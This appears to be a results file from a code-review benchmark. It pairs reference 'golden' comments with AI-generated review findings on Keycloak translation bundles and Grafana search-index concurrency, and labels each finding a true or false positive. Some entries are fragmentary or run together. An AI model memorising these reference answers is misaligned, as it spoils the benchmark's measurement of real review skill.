`error-invalid-multivalued-size` was changed from `Attribute {{0}} must have at least {{1}} and at most {{2}} value(s).` to `Attribute {0} must have at least {1} and at most {2} {2,choice,0#values|1#value|1<values}.`. This file is consumed by the React/i18next based account console, where interpolation uses the double-brace syntax (see `backTo=Back to {{app}}` on line 3 and `error-invalid-length='{{0}}' must have a length between {{1}} and {{2}}.` on line 140). Single-brace placeholders are not interpolated by i18next, and `{2,choice,...}` is Java MessageFormat/ChoiceFormat syntax that i18next cannot evaluate, so the user will see the literal text `{0}`, `{1}` and `{2,choice,0#values|1#value|1<values}` instead of the actual limits and pluralized word.

Java ChoiceFormat syntax introduced into admin UI i18next bundle

`error-invalid-multivalued-size` now uses `{0}`/`{1}`/`{2}` plus a Java ChoiceFormat expression `{2,choice,0#values|1#value|1<values}`. The admin console translates these keys with i18next (double-brace interpolation, as used by the other `{{0}}`-style error keys in this bundle), which neither substitutes single-brace placeholders nor understands ChoiceFormat. The message will be rendered verbatim to administrators, including the raw choice expression.

Malformed character class makes English-file path derivation match too much

`replaceAll("_[a-zA-Z-_]*\\.properties", "_en.properties")` contains the class `[a-zA-Z-_]`, where the trailing `-_` is parsed by java.util.regex as the range 0x2D..0x5F. That range covers `-`, `.`, `/`, digits, `:` and all upper-case letters, so the pattern can match far beyond the file name: for an absolute path that contains an underscore in any parent directory (e.g. a CI workspace like `/build_dir/keycloak/themes/.../messages_de.properties`) the greedy match starts at that earlier underscore and the whole path segment chain is replaced, producing a bogus English path and an immediate build failure. Escape the dash (`[a-zA-Z_-]`) and/or derive the sibling file from `File#getName()` only.

Missing English counterpart aborts the build with an opaque RuntimeException

If the derived `_en.properties` file does not exist (community-only bundles, base `messages.properties` files whose name does not match the locale regex, or any path-derivation mistake), `verifySafeHtml` throws a raw `RuntimeException`. `verify()` only catches `IOException`, so this escapes the Mojo as an unhandled runtime exception instead of a `MojoExecutionException` or a collected verification message, giving maintainers a stack trace rather than an actionable error.

Diff substring can throw StringIndexOutOfBoundsException while reporting a violation

The common-prefix (`start`) and common-suffix (`end`) counters are computed independently and can overlap when the sanitized string differs in length from the input (the sanitizer regularly adds characters, e.g. missing close tags). For example value="aba" and sanitized="abba" yields start=2 and end=2, so `value.substring(2, 3-2)` throws StringIndexOutOfBoundsException. The verifier then crashes with an index error instead of reporting the illegal HTML it just detected. Clamp the indices so that `start + end <= min(value.length(), sanitized.length())`.

Anchor-mismatch message does not identify the file or key

The message `"Didn't find anchor tag " + matcher.group() + " in original string"` omits both the properties file and the message key, unlike the HTML violation message a few lines above which includes `key` and `file`. Since the plugin runs over hundreds of bundles, a contributor seeing only this line cannot tell which translation needs fixing.

No test asserts that valid translations produce no findings

All four tests only assert that a violation message is present. There is no test feeding a legitimate translation (e.g. a `_de` file containing the same `<b>`/`<a href="...">` markup as its `_en` counterpart, or a message with a `{n,choice,...}` pattern) and asserting the result list is empty. Without such a case, false positives introduced by the normalization logic (unescaping, `<!-- -->` stripping, choice-format whitelist) would go unnoticed and break the whole build.

true_positives.matched_candidate:
Null check for rawTokenId actually re-checks grantType

true_positives.golden_comment: In isAccessTokenId, the substring for the grant shortcut and the equality check look inverted: the grant shortcut occupies indices 4–5 (substring(4,6)), and a match should return true (combined with UUID check), not false.
true_positives.matched_candidate:
isAccessTokenId matcher never checks the grant shortcut (inverted condition + wrong indices)

The new matcher is supposed to verify that an access-token ID looks like `<sessionType><tokenType><grantType>:<uuid>` and that the grant part equals `expectedGrantShortcut`. true_positives.golden_comment: A race condition in BuildIndex allows multiple goroutines to concurrently build the same expensive index for the same key. This is caused by moving the b.cacheMu lock from protecting the entire function to only protecting the final cache assignment.
true_positives.matched_candidate:

`BuildIndex` no longer holds `cacheMu` for the duration of the build; it only locks when inserting into the cache. Because `searchSupport.getOrCreateIndex` checks `GetIndex` and then calls `BuildIndex` without any per-key serialization, two callers (e.g. a search request and a watch event for the same namespace/group/resource) can now build the same index concurrently. For file-backed indexes both goroutines call `bleve.New` on the same directory `b.opts.Root/<ns>/<resource>.<group>` at the same time, which can fail or corrupt the on-disk index; both also increment `IndexMetrics.IndexTenants` and the second cache write silently discards the first index (leaking its open bleve index/file handles). Some form of per-key locking (e.g. a keyed mutex / single-flight) is needed to keep the previous mutual exclusion while still allowing different keys to build in parallel.
true_positives.reasoning: The candidate identifies the same race condition: BuildIndex no longer holds cacheMu for the full build, only during cache insertion, so concurrent callers can build the same key simultaneously. The extra details about bleve corruption and metrics are consequences of that same bug.

true_positives.golden_comment: Calling s.search.TotalDocs() here may race with concurrent index creation: TotalDocs iterates b.cache without synchronization, and the event watcher goroutine started just above could trigger BuildIndex writes concurrently, potentially causing a concurrent map read/write panic.
true_positives.matched_candidate:
TotalDocs iterates the index cache without holding cacheMu, racing with BuildIndex writes

`TotalDocs()` ranges over `b.cache` without taking `b.cacheMu` (read) lock, while `BuildIndex` now writes into `b.cache` under a short-lived write lock (lines 137-139). This is a genuine data race that Go turns into a fatal runtime error ("concurrent map iteration and map write"), which crashes the process. The new call site makes it reachable: `searchSupport.init` starts the watch-event goroutine (search.go lines 207-213) and only afterwards logs `s.search.TotalDocs()` (search.go line 216); any watch event handled in that goroutine can call `getOrCreateIndex` -> `build` -> `BuildIndex`, writing the map while `TotalDocs` is iterating. `TotalDocs` should take `cacheMu.RLock()`.
true_positives.reasoning: The candidate identifies the same race: TotalDocs iterates b.cache without cacheMu while the watcher goroutine can concurrently trigger BuildIndex writes, causing a concurrent map iteration/write panic. The wording and suggested RLock fix align with the golden comment.

false_positives.candidate:

`ctx, cancel := context.WithCancel(...)` is created at line 229, but on the new error path `s.Init(ctx)` -> `return nil, err` (lines 258-262) `cancel()` is never called. The context is never cancelled, so any background work tied to it (and the context itself) is leaked, and the partially-initialized server's goroutines (e.g. the SQL poller / watch goroutines started during `search.init`) keep running for the lifetime of the process even though the constructor reported failure. `go vet`'s lostcancel check will also flag this. Call `cancel()` before returning the error.

Full index build now happens synchronously inside the constructor with no deadline or cancellation

`NewResourceServer` now calls `s.Init(ctx)` with the server's own background context, which runs `lifecycle.Init`, the complete search index build over every namespace, and `initWatcher`. The constructor is invoked from the service-wiring path, so Grafana/storage-server startup is blocked for as long as indexing takes (minutes for large installations) and there is no way for the caller to pass a deadline or cancel the work - the caller's context is ignored and the internal context is only cancelled by `Stop`, which can't run yet. Consider accepting a context (or running the index build in the background and gating only search on it) so startup cannot hang indefinitely.

After Stop(), requests are no longer rejected because no method checks initErr anymore

`Stop` communicates shutdown exclusively by setting `s.initErr` to "service is stopping"/"service is stopped", which used to be surfaced because every RPC method began with `if err := s.Init(ctx); err != nil`. Those checks were all removed in this PR, so `s.initErr` is now write-only dead state: after `Stop` cancels the background context, Create/Update/Delete/Read/List/Watch/Search/blob calls still execute and will fail with opaque "context canceled" errors or operate against a torn-down backend instead of returning the clear "service is stopping" error. A explicit stopped/closed flag checked by the public methods (or returning an error from the entry points) is needed to preserve the previous contract.

Shared err and totalBatchesIndexed are mutated from errgroup goroutines (data race)

Inside `init`, each `group.Go` closure assigns to the enclosing `err` variable (`_, _, err = s.build(...)`) and increments the enclosing `totalBatchesIndexed`. With `initWorkers > 1` these run concurrently, so both are unsynchronized writes to shared variables: `go test -race` will flag it, the reported batch count can be wrong, and the `err` returned by one goroutine can be overwritten by another before `group.Wait()` observes it, so a build failure may be silently hidden or a spurious error attributed. Use local variables inside the closure (`idxErr := ...; return idxErr`) and an atomic counter.

BuildIndex span context is still discarded, so child spans do not nest under it

This PR's stated goal is fixing trace propagation (the callers in search.go and sql/backend.go were changed from `_, span :=` to `ctx, span :=`), but `bleveBackend.BuildIndex` still does `_, span := b.tracer.Start(ctx, ...)` and the builder callback keeps using the caller's context. As a result the storage `ListIterator` spans emitted while building are siblings of the `unified_search.bleve.BuildIndex` span rather than children, leaving BuildIndex as a leaf in traces and defeating the purpose of the change.

The only integration test that boots the `StorageServer` target (and therefore exercises the new eager `NewResourceServer` initialization path) is now skipped for postgres with only a TODO comment. Combined with the existing sqlite skip, this leaves mysql as the sole DB covered, so a startup regression specific to postgres - plausible given init now runs synchronously at construction - would go undetected. The skip should reference a tracking issue or the failure should be diagnosed before merge.
